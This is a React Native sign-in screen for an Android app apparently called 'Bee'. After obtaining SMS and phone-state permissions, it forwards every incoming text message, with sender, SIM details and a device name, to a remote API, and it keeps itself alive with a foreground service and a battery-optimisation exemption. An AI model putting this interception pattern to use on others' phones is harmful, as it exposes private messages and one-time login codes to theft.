import React, { useState, useEffect } from "react";
import {
  PermissionsAndroid,
  Platform,
  View,
  Alert,
  NativeModules,
} from "react-native";
import {
  Button,
  HStack,
  VStack,
  Text,
  Link,
  Spinner,
  Divider,
  Image,
  useColorModeValue,
  IconButton,
  Modal,
  useToast,
  Center,
  Hidden,
  StatusBar,
  Stack,
  Box,
} from "native-base";
import {
  isIgnoringBatteryOptimizations,
  requestIgnoreBatteryOptimizations,
  openBackgroundSettings,
  isBackgroundSettingSupported,
  backgroudSettingTip,
} from "react-native-platform";
import { useKeepAwake } from "@sayem314/react-native-keep-awake";
import Storage from "../../public/Storage";
import { MaterialIcons } from "@expo/vector-icons";

import FloatingLabelInput from "./components/FloatingLabelInput";
import SmsListener from "react-native-android-sms-listener2";
import SmsAndroid from "react-native-get-sms-android-v2";
import VIForegroundService from "@voximplant/react-native-foreground-service";
import RNRestart from "react-native-restart";
import { createSms } from "../../api/sms";

let subscription = null;

export function SignInForm({ props }) {
  const [text, setText] = useState("");
  const [readSms, setReadSms] = useState(false);
  const [receiveSms, setReceiveSms] = useState(false);
  const [power, setPower] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const toast = useToast();
  const RNSimData = NativeModules.RNSimDataModule;
  useKeepAwake();

  // console.log(Platform);

  const listenSms = async (params) => {
    if (subscription) {
      subscription.remove();
    }
    let name = await Storage.getItem("name");
    console.log("listenSms: ", name);
    subscription = SmsListener.addListener(async (message) => {
      let data = {
        ...params,
        title: name || text || Platform.constants.Manufacturer || "用户未设置",
        message: message.body,
        extra: JSON.stringify({ ...params.extra, message }),
        phone: message.originatingAddress,
      };
      console.log("data: ", data);
      createSms(data)
        .then((result) => {
          console.log("result: ", result);
        })
        .catch((err) => {
          console.log("err: ", err);
        });
    });
  };

  const batteryOptimization = async () => {
    if (Platform.OS === "android" && Platform.Version >= 23) {
      const ignored = await isIgnoringBatteryOptimizations();
      console.log("ignored: ", ignored);
      if (!ignored) {
        requestIgnoreBatteryOptimizations();
      } else {
        setPower(true);
        console.log("本 App 已加入电池保护名单: ");
      }
    } else {
      Alert.alert("Tip", "Only supports Android 6 and above");
    }
  };

  const showBackgroundSettingHandle = async () => {
    if (Platform.OS !== "android") {
      Alert.alert("Tip", "Only supports Android 6 and above");
      return;
    }

    const ignored = await isIgnoringBatteryOptimizations();
    if (!ignored) {
      requestIgnoreBatteryOptimizations();
    } else {
      Alert.alert(
        "Tip",
        "This App has been added to the battery protection list"
      );
      return;
    }

    if (!isBackgroundSettingSupported()) {
      Alert.alert("Tip", "This setting is not supported on this phone");
      return;
    }

    Alert.alert("Tip", backgroudSettingTip(), [
      {
        text: "Enter",
        onPress: async () => {
          try {
            await openBackgroundSettings();
          } catch (e) {
            console.log("openBackgroundSettings failed: " + e.message);
          }
        },
      },
    ]);
  };

  const startService = async () => {
    if (Platform.OS !== "android") {
      console.log("Only Android platform is supported");
      return;
    }

    if (Platform.Version >= 26) {
      const channelConfig = {
        id: "ForegroundServiceChannel",
        name: "Bee",
        description: "Bee running",
        enableVibration: false,
        importance: 5,
      };
      await VIForegroundService.createNotificationChannel(channelConfig);
    }
    let notificationConfig = {
      channelId: "ForegroundServiceChannel",
      id: 3456,
      title: "Bee",
      text: "Bee running",
      icon: "ic_notification",
      priority: 2,
    };
    if (Platform.Version >= 26) {
      notificationConfig.channelId = "ForegroundServiceChannel";
    }
    await VIForegroundService.startService(notificationConfig);
  };

  const requestOnceSms = async () => {
    console.log(Platform);
    // miui比较特殊，是动态权限，第一次使用的时候才触发
    if (
      Platform.constants.Brand.toLocaleLowerCase() === "xiaomi" &&
      Platform.constants.Release > 10
    ) {
      var filter = {
        box: "inbox", // 'inbox' (default), 'sent', 'draft', 'outbox', 'failed', 'queued', and '' for all
        read: 1, // 0 for unread SMS, 1 for SMS already read
        body: "1", // content to match
        indexFrom: 0, // start from index 0
        maxCount: 1, // count of SMS to return each time
      };
      SmsAndroid.list(
        JSON.stringify(filter),
        (fail) => {
          console.log("Failed with this error: " + fail);
        },
        (count, smsList) => {
          console.log("Count: ", count);
        }
      );
    }
  };

  const requestReadSmsPermission = async () => {
    let permissions = {
      READ_SMS: PermissionsAndroid.PERMISSIONS.READ_SMS,
      RECEIVE_SMS: PermissionsAndroid.PERMISSIONS.RECEIVE_SMS,
      READ_PHONE_STATE: PermissionsAndroid.PERMISSIONS.READ_PHONE_STATE,
    };

    try {
      var result = await PermissionsAndroid.requestMultiple(
        Object.values(permissions)
      );
      setReadSms(result[permissions.READ_SMS] === "granted");
      setReceiveSms(result[permissions.RECEIVE_SMS] === "granted");
      console.log("result", result);
      if (
        result[permissions.READ_SMS] === "granted" &&
        result[permissions.RECEIVE_SMS] === "granted" &&
        result[permissions.READ_PHONE_STATE] === "granted"
      ) {
        console.log("所有权限已经允许");
        return true;
      } else if (
        result[permissions.READ_SMS] === "never_ask_again" ||
        result[permissions.RECEIVE_SMS] === "never_ask_again" ||
        result[permissions.READ_PHONE_STATE] === "never_ask_again"
      ) {
        Alert.alert(
          "Tip",
          "Please Go into Settings -> Applications -> APP_NAME -> Permissions and Allow permissions to continue",
          [
            {
              text: "Enter",
              onPress: async () => {
                try {
                  await openBackgroundSettings();
                } catch (e) {
                  console.log("openBackgroundSettings failed: " + e.message);
                }
              },
            },
          ]
        );
      } else {
        return false;
      }
    } catch (error) {
      console.log("error: ", error);
      return false;
    }
  };

  const requestReadSmsPermissionHandle = async () => {
    let title = await Storage.getItem("name");
    let isfirst = await Storage.getItem("isfirst");
    if (title) setText(title);

    requestReadSmsPermission()
      .then(async (result) => {
        if (result) {
          batteryOptimization();
          const simInfo = RNSimData;
          console.log("simInfo.: ", simInfo);
          if (!simInfo) {
            if (isfirst != 0) {
              await Storage.setItem("isfirst", "0");
              RNRestart.Restart();
            }
          }
          let data = {
            extra: { simInfo },
          };

          listenSms(data);
        } else {
          setShowModal(true);
        }
      })
      .catch((err) => {
        console.log("err: ", err);
      });
  };

  useEffect(async () => {
    requestReadSmsPermissionHandle();
    startService();

    // To check if the user has permission
    // const status = await RNAndroidNotificationListener.getPermissionStatus()
    // console.log('status: ', status);
  }, []);

  return (
    <Box
      contentContainerStyle={{
        flexGrow: 1,
      }}
      style={{
        flex: 1,
      }}
    >
      <VStack
        flex="1"
        px="6"
        py="9"
        _light={{
          bg: "white",
        }}
        _dark={{
          bg: "coolGray.800",
        }}
        space="3"
        justifyContent="space-between"
        borderTopRightRadius={{
          base: "2xl",
          md: "xl",
        }}
        borderBottomRightRadius={{
          base: "0",
          md: "xl",
        }}
        borderTopLeftRadius={{
          base: "2xl",
          md: "0",
        }}
      >
        <VStack space="7">
          <VStack>
            <VStack space="3">
              <FloatingLabelInput
                isRequired
                label="Please fill in the name"
                labelColor="#9ca3af"
                labelBGColor={useColorModeValue("#fff", "#1f2937")}
                borderRadius="4"
                defaultValue={text}
                onChangeText={(txt) => {
                  setText(txt);
                  Storage.setItem("name", text);
                }}
                _text={{
                  fontSize: "sm",
                  fontWeight: "medium",
                }}
                _dark={{
                  borderColor: "coolGray.700",
                }}
                _light={{
                  borderColor: "coolGray.300",
                }}
              />
              {!text ? (
                <Text style={{ paddingLeft: 8, color: "red" }}>
                  Please fill in the name
                </Text>
              ) : null}

              <Button
                mt="5"
                size="md"
                borderRadius="4"
                _text={{
                  fontWeight: "medium",
                }}
                _light={{
                  bg: "primary.900",
                }}
                _dark={{
                  bg: "primary.700",
                }}
                onPress={async () => {
                  if (!text) return;
                  await Storage.setItem("name", text);
                  setText(text);
                  requestOnceSms();
                  toast.show({
                    title: "submit successfully ",
                    status: "success",
                    description: "Please do not turn off your mobile phone.",
                  });
                }}
              >
                SUBMIT
              </Button>
            </VStack>
          </VStack>
        </VStack>
        <HStack
          space="1"
          safeAreaBottom
          alignItems="center"
          justifyContent="center"
          mt={{
            base: "auto",
            md: "8",
          }}
        >
          <Link
            _text={{
              textDecoration: "none",
              fontWeight: "bold",
            }}
            _dark={{
              _text: {
                color: "primary.500",
              },
            }}
            onPress={async () => {
              requestReadSmsPermissionHandle();
            }}
          >
            Click Checking Permission Information
          </Link>
        </HStack>
        <HStack space="2" alignItems="center" justifyContent="center">
          <Text>READ_SMS:{readSms ? "yes" : "no"}</Text>
          <Text>RECEIVE_SMS:{receiveSms ? "yes" : "no"}</Text>
          <Text>POWER:{power ? "yes" : "no"}</Text>
        </HStack>

        <Modal
          isOpen={showModal}
          onClose={() => setShowModal(false)}
          closeOnOverlayClick={false}
        >
          <Modal.Content maxWidth="400px">
            <Modal.CloseButton />
            <Modal.Header>IMPORTANT NOTICE</Modal.Header>
            <Modal.Body>
              For normal use, please enable all permissions
            </Modal.Body>
            <Modal.Footer>
              <Button.Group space={2}>
                <Button
                  onPress={() => {
                    setShowModal(false);
                  }}
                >
                  Enter
                </Button>
              </Button.Group>
            </Modal.Footer>
          </Modal.Content>
        </Modal>
      </VStack>
    </Box>
  );
}
export default function SignIn(props) {
  return (
    <>
      <StatusBar
        translucent
        backgroundColor="transparent"
        barStyle="light-content"
      />
      <Box
        safeAreaTop
        _light={{
          bg: "primary.900",
        }}
        _dark={{
          bg: "coolGray.900",
        }}
      />
      <Box
        bg="primary.900"
        style={{ position: "absolute", right: 20, top: 26, zIndex: 2 }}
      >
        <IconButton
        onPress={()=>{
          props.navigation.navigate('setting')
        }}
          size="sm"
          variant="solid"
          bg="primary.900"
          _icon={{
            as: MaterialIcons,
            name: "menu",
          }}
        />
      </Box>
      <Center
        my="auto"
        _light={{
          bg: "primary.900",
        }}
        flex="1"
      >
        <Stack
          flexDirection={{
            base: "column",
            md: "row",
          }}
          w="100%"
          maxW={{
            md: "1016px",
          }}
          flex={{
            base: "1",
            md: "none",
          }}
        >
          <Hidden from="md">
            <VStack px="4" mt="4" mb="5" space="9">
              <HStack space="2" alignItems="center"></HStack>
              <VStack space="2">
                <Text fontSize="3xl" fontWeight="bold" color="coolGray.50">
                  Welcome back,
                </Text>
                <Text
                  fontSize="md"
                  fontWeight="normal"
                  _dark={{
                    color: "coolGray.400",
                  }}
                  _light={{
                    color: "primary.300",
                  }}
                >
                  Please remain in this interface, do not close
                </Text>
              </VStack>
            </VStack>
          </Hidden>
          <SignInForm props={props} />
        </Stack>
      </Center>
    </>
  );
}
